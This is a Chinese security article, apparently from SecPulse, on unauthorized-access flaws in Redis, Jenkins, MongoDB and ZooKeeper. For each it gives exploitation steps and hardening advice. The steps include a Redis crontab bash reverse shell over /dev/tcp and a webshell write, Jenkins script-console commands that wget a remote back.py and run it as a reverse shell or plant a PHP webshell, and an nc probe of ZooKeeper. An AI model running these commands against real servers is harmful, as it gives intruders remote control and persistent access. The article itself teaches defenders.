作者：[w2n1ck@安全脉搏](https://mp.weixin.qq.com/s/Q-an-kpdE7r8Q9bX2YNbTA
"w2n1ck@安全脉搏")
#### 前言
今年5月，比特币勒索病毒 WannaCry
席卷全球，国内众多机构部门计算机系统瘫痪。根据之前应急响应的案例分析，以及一些安全报告统计，目前大部分的勒索病毒均利用未授权访问等通用漏洞进行植入、勒索，尤其是
Redis、MongoDB
等数据库的未授权访问漏洞尤其严重。参见[《【脉搏译文系列】如何高效的应对勒索软件》](https://www.secpulse.com/archives/61046.html
"《【脉搏译文系列】如何高效的应对勒索软件》")
#### 0x01 介绍
未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露。
目前主要存在未授权访问漏洞的有：NFS 服务，Samba
服务，LDAP，Rsync，FTP，GitLab，Jenkins，MongoDB，Redis，ZooKeeper，ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Dubbo
等，本文主要介绍一些目前比较常用的一些服务的未授权访问，欢迎大家补充！
#### 0x02 Redis未授权访问
##### 2.1 漏洞描述
Redis 因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行 flushall 来清空所有数据。如果 Redis
以 root 身份运行，可以给 root 账户写入 SSH 公钥文件，直接通过 SSH 登录受害服务器。
##### 2.2 漏洞利用
###### 1、利用计划任务执行命令反弹shell
在 redis 以 root 权限运行时可以写 crontab 来执行命令反弹shell
先在自己的服务器上监听一个端口
`nc -lvnp 4444`
然后执行命令:
    redis-cli -h 192.168.2.6
    set x "\n* * * * * bash -i >& /dev/tcp/192.168.1.1/4444 0>&1\n"
    config set dir /var/spool/cron/
    config set dbfilename root
    save
###### 2、写 ssh-keygen 公钥登录服务器
在以下条件下，可以利用此方法
  1. Redis服务使用 root 账号启动
  2. 服务器开放了 SSH 服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。此方法具体参考：[redis配置不当可直接导致服务器被控制](https://www.secpulse.com/archives/40406.html "redis配置不当可直接导致服务器被控制")
###### 3、获取 web 服务的 webshell
当 redis 权限不高时，并且服务器开着 web 服务，在 redis 有 web 目录写权限时，可以尝试往 web 路径写 webshell。
执行以下命令
    config set dir /var/www/html/
    config set dbfilename shell.php
    set x ""
    save
即可将 shell 写入 web 目录
##### 2.3 漏洞加固
可以配置 redis.conf 这个文件，在安装目录下
1、默认只对本地开放  
bind 127.0.0.1
2、添加登陆密码  
requirepass www.secpulse.com
3、在需要对外开放的时候修改默认端口  
port 2333
4、最后还可以配合iptables限制开放
#### 0x03 Jenkins 未授权访问
##### 3.1 漏洞描述
默认情况下 Jenkins
面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。
##### 3.2 漏洞利用
###### 1、Jenkins 未授权访问可执行命令
http://www.secpulse.com:8080/manage  
http://www.secpulse.com:8080/script
`println "ifconfig -a".execute().text` 执行一些系统命令
直接 wget 下载 back.py 反弹 shell
    println "wget http://xxx.secpulse.com/tools/back.py -P /tmp/".execute().text
    println "python /tmp/back.py 10.1.1.111 8080".execute().text
back.py 并不需要 root 权限
不想反弹试试 Terminal Plugin
###### 2、Jenkins 未授权访问写 shell
jenskins 是 java web 项目,我们用 java 的 File 类写文件
    new File("c://temp//secpulse.txt").write("""
    1
    2
    3
    """);
新建一个内容为1,2,3(每一行)的 1.txt 到 c 盘的 temp 文件夹,运行如下命令`println “powershell dir
c:\temp”.execute().text`如果写成功,那么 secpulse.txt 就会在返回结果中!
wget写webshell
    1. println "wget http://shell.secpulse.com/data/t.txt -o /var/www/html/secpulse.php".execute().text
    2. new File("/var/www/html/secpulse.php").write('');
    3. def webshell = ''
    new File("/var/www/html/secpulse.php").write("$webshell");
    4. def execute(cmd) {
    def proc = cmd.execute()
    proc.waitFor()
    }
    execute( [ 'bash', '-c', 'echo -n " /usr/local/nginx_1119/html/secpulse.php' ] )
    execute( [ 'bash', '-c', 'echo "_POST[s3cpu1se]);?>" >> /usr/local/nginx_1119/html/secpulse.php' ] )
    //参数-n 不要在最后自动换行
Result: 0 表示成功写入 Result: 1 表示目录不存在或者权限不足 写入失败 Result: 2 表示构造有异常 写入失败
具体其他详细利用方法参考：[知其一不知其二之Jenkins
Hacking](https://www.secpulse.com/archives/2166.html "知其一不知其二之Jenkins
Hacking")
##### 3.3 漏洞加固
1、禁止把Jenkins直接暴露在公网
2、添加认证，设置强密码复杂度及账号锁定。
#### 0x04 MongoDB未授权访问
##### 4.1 漏洞描述
开启 MongoDB
服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。
##### 4.2 漏洞利用
##### 4.3 漏洞加固
###### 1、为MongoDB添加认证：
1)MongoDB启动时添加--auth参数
2)给MongoDB添加用户：
use admin #使用admin库
db.addUser("root", "123456") #添加用户名root密码123456的用户
db.auth("root","123456") #验证下是否添加成功，返回1说明成功
###### 2、禁用HTTP和REST端口
MongoDB 自身带有一个 HTTP 服务和并支持 REST 接口。在2.6以后这些接口默认是关闭的。mongoDB
默认会使用默认端口监听web服务，一般不需要通过 web 方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择 `–nohttpinterface`
参数 `nohttpinterface=false`
###### 3、限制绑定IP
启动时加入参数`--bind_ip 127.0.0.1`
或在`/etc/mongodb.conf`文件中添加以下内容：`bind_ip = 127.0.0.1`
#### 0x05 ZooKeeper 未授权访问
##### 5.1 漏洞描述
Zookeeper 的默认开放端口是2181。Zookeeper 安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用
Zookeeper，通过服务器收集敏感信息或者在 Zookeeper 集群内进行破坏（比如：kill命令）。攻击者能够执行所有只允许由管理员运行的命令。
##### 5.2 漏洞利用
执行以下命令即可远程获取该服务器的环境： echo envi | nc ip port
直接连接： ./zkCli.sh -server ip:port
##### 5.3 漏洞加固
1、禁止把 Zookeeper 直接暴露在公网
2、添加访问控制，根据情况选择对应方式（认证用户，用户名密码）